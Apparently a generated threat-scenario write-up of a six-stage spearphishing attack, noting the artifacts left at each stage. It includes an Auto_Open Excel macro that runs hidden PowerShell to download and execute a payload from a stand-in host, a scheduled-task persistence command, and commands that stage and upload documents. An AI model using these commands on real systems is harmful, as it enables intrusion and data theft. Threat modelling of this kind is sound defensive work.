<output>
Pattern Name: Spearphishing Attachment

Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment designed to exploit a vulnerability in Microsoft Excel. The attack progresses from the initial email interaction to the execution of a payload that allows the attacker to gain control over the victim's machine.

Attack Flow Breakdown:

**Stage 1: Initial Access via Email**
- **Applications Involved**: Outlook
- **User Action**: The user receives an email with a subject line "Important Update" and an attached Excel file named "Invoice_2023.xlsx".
- **Key Artifacts**: Email headers, attachment file (Invoice_2023.xlsx).
  
```shell
# The user opens the email in Outlook and clicks on the attachment.
# This action triggers the download of the file to the local system.
```

**Stage 2: Exploit Execution**
- **Applications Involved**: Excel
- **User Action**: The user opens the attachment in Excel, which contains a macro designed to execute a PowerShell command.
- **Key Artifacts**: Excel file with embedded macro, PowerShell command.
  
```shell
# The macro is executed automatically when the user opens the file.
# The macro may look like this:
Sub Auto_Open()
    ' This macro executes a PowerShell command to download and execute a payload
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'http://malicious-website.com/payload.exe' -OutFile 'C:\Users\Victim\Downloads\payload.exe'; Start-Process 'C:\Users\Victim\Downloads\payload.exe'"""
End Sub
```

**Stage 3: Payload Download and Execution**
- **Applications Involved**: PowerShell, Windows Explorer
- **User Action**: The PowerShell command downloads the malicious executable and executes it.
- **Key Artifacts**: Downloaded file (payload.exe), PowerShell command logs.
  
```shell
# The PowerShell command downloads the payload from the attacker-controlled server.
# The command executed would be logged in the PowerShell event logs.
```

**Stage 4: Establishing Persistence**
- **Applications Involved**: Windows Task Scheduler
- **User Action**: The payload creates a scheduled task to ensure persistence.
- **Key Artifacts**: Scheduled task entry, task configuration file.
  
```shell
# The payload may create a scheduled task to run itself at startup.
# Example command to create a scheduled task:
schtasks /create /tn "MaliciousTask" /tr "C:\Users\Victim\Downloads\payload.exe" /sc onlogon /rl highest
```

**Stage 5: Data Exfiltration Preparation**
- **Applications Involved**: PowerShell, Network
- **User Action**: The payload scans for sensitive files and prepares them for exfiltration.
- **Key Artifacts**: List of collected files, network traffic to exfiltration server.
  
```shell
# The payload may use PowerShell to find sensitive documents.
# Example command to find files:
Get-ChildItem -Path "C:\Users\Victim\Documents" -Include *.docx, *.xlsx, *.pdf -Recurse | ForEach-Object { Copy-Item $_.FullName "C:\Temp\StagedFiles\" }
```

**Stage 6: Data Exfiltration**
- **Applications Involved**: PowerShell, Network
- **User Action**: The payload uploads the staged files to an external server.
- **Key Artifacts**: Outbound network connections, logs of file uploads.
  
```shell
# The payload uploads the collected files to the attacker's server.
# Example command to upload files:
Invoke-WebRequest -Uri 'http://malicious-website.com/upload' -Method POST -InFile 'C:\Temp\StagedFiles\*'
```

</output>